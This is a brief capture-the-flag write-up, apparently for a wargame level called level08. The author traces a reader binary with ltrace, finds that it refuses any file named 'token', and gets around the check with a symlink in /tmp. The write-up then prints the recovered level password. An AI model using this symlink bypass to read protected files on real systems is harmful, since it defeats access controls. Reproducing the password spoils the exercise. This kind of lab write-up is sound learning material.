Ok !
We have here two files a bin level08 and a file named token

The level08 binary seems to be a simple reader
It can read a file created in /tmp but not the token file:
"You may not access 'token'"

Thus, with ltace, we have

ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                        = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                    = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++


The bin make verification on the file name 'token'

We could change the name of the file token but we haven't the rights too

THEN ! We can create a simlink to token, from the /tmp dir, called "sl" here:
ln -s ~/token /tmp/f/sl

pw printed: quif5eloekouj29ke0vouxean

This works !
